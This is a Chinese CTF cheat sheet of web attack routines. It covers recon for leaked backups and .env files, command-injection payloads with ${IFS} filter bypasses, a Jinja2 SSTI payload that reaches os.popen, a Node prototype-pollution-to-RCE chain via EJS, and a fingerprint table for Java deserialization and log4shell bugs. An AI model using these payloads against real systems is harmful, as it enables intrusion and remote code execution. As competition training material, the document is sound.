# 04 · 攻击套路（抢分小抄）

> 原则：**自动化踩点全量题 + 手打只打签到/中档**。硬题 0 分钟投入。
> 命令全部无破坏性（只读 flag、只留 marker）。

## 1. 开局必踩的点（自动化可全包）

- 备份文件：`/backup.zip` `/src.zip` `/.git/` `/www.zip` `/.env` `/.DS_Store` `/index.php.bak`
- 信息页：`/robots.txt` `/flag`（裸奔）/ 面板路径 `/admin`
- 响应指纹：`Set-Cookie: PHPSESSID/` `JSESSIONID/` `connect.sid/` `Werkzeug` → 定语言栈
- 软 404 基线：先打一个肯定不存在的路径记下响应，后面对比防误报

## 2. 命令注入 payload 骨架

```
探测（回显型）:  ;id    |id    `id`    $(id)    &&id
探测（标记型）:  echo${IFS}sn1""per     ← 引号拆词防"参数回显"误报
读 flag:        $(sort${IFS}/f*)        ← ${IFS} 代空格；/f* 通配防字样过滤
               $(grep${IFS}fla${IFS}/f*)
```

实测教训（踩过才算数）：
- dash 里 `$(sort </f*)` **不行**——重定向目标不做路径展开，glob 只在命令参数位置有效。
- `$(id)` 的输出会被拼进 ping 参数，报错只回显最后一个 token；所以探测用 `echo` 标记而不是 `id`。
- 参数本身回显在页面上的题（如搜索框），比对前要把 payload 从响应里剥掉，否则注入/布尔盲注全误报。

## 3. SSTI payload 阶梯（Jinja2）

```
探测:   {{7*7}}                     → 49
利用:   {{lipsum.__globals__['o'+'s'].popen('cat /flag').read()}}   ← 字符串拼接过黑名单
绕过:   {{(cycler.__init__.__globals__['o'+'s'])...}} / environ / config
修复视角：黑名单挡 {{ lipsum cycler __globals__ __subclasses__ 基本够用
```

## 4. 原型污染链（Node）

```
① 金丝雀探测: {"__proto__":{"awpwn1":"PWNED"}} → 后续请求是否 Object.prototype.awpwn1 出现
② 污染点: deepMerge / Object.assign 递归合并不挡 __proto__
③ gadget: EJS <3.1.8 的 outputFunctionName → RCE（≥3.1.8 已加标识符校验，链子死）
```

## 5. Java 认得出（不要求会打，5 特征 15 分钟赌一把）

| 看到什么 | 想到什么 | 版本速查 |
|---|---|---|
| `rememberMe=deleteMe` Cookie | Shiro 反序列化（Padding Oracle / CB） | shiro ≤1.2.24 / 1.4.1 |
| `${jndi:`（log4shell 打日志点） | log4j2 RCE | log4j-core ≤2.14.x |
| POST JSON 里有 `@type` | fastjson/jackson 反序列化 | fastjson ≤1.2.47 全通杀 |
| `rO0AB` / `aced0005`（Cookie/参数 base64 或 hex） | 原生 Java 反序列化 | 配合 ysoserial gadget |
| Whitelabel Error / `/actuator` | Spring Boot | 端点泄露 → env/heapdump |

打法：指纹 → 定版本 → 翻**本地 payload 库**（赛前备好，断网）→ 直接打。识别不出 15 分钟撤。

## 6. 开源项目魔改题：diff 法

1. 从 `package.json` / `pom.xml` / composer.json / Dockerfile 认出项目名和版本
2. 官方源码（本地备）`diff -r` 下发代码 → 改动处就是漏洞点（几百个文件也不怕，diff 只看差异）
3. 出题人套路通常是：删一处校验 / 放开一个参数 / 加一个接口

## 7. 自动化：sniper 思路

单文件标准库踩点器（无依赖、拷进赛场就能跑）：

```
recon  → 踩点：泄露文件 + 软404基线 + 指纹 + 表单（含二级页面，很多题表单不首页）
snipe  → 参数电池：命令注入(echo标记) / SSTI(7*7→引擎分型) / LFI(php://filter) /
         SQLi(报错正则+布尔剥壳) / 原型污染(金丝雀)
x      → 手工桥: sniper.py x 'http://host/?ip={P}' 'cat /flag'   {P} 占位符
```

本仓库训练靶场实测：PHP 命令注入题 1.9s 全自动出 flag、Flask SSTI 题 0.6s。
（脚本本体在 `tools/sniper.py`，附赠两个防误报细节：标记写 `sn1""per`；布尔对比前剥 payload。）
